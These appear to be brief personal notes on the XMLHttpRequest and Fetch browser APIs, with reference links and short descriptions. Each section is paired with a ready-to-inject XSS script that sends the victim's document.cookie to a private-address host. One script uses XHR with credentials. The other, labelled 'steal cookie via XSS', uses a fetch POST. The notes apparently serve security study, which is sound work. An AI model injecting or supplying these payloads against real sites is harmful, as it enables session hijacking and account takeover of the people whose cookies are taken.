
# XMLHttpRequest
https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest
https://javascript.info/xmlhttprequest


XMLHttpRequest (XHR) objects are used to interact with servers. You can retrieve data from a URL without having to do a full page refresh. This enables a Web page to update just part of a page without disrupting what the user is doing.

<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://192.168.46.128/?"+document.cookie, true); 
xhr.withCredentials = true;
xhr.send(null);
</script>

# Fetch API
https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch
https://stackoverflow.com/questions/35549547/fetch-api-vs-xmlhttprequest

The Fetch API provides a JavaScript interface for accessing and manipulating parts of the protocol, such as requests and responses. It also provides a global fetch() method that provides an easy, logical way to fetch resources asynchronously across the network.

This kind of functionality was previously achieved using XMLHttpRequest. 

Fetch provides a better alternative that can be easily used by other technologies such as Service Workers. Fetch also provides a single logical place to define other HTTP-related concepts such as CORS and extensions to HTTP

steal cookie via XSS 

<script>
fetch('http://192.168.46.128', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>

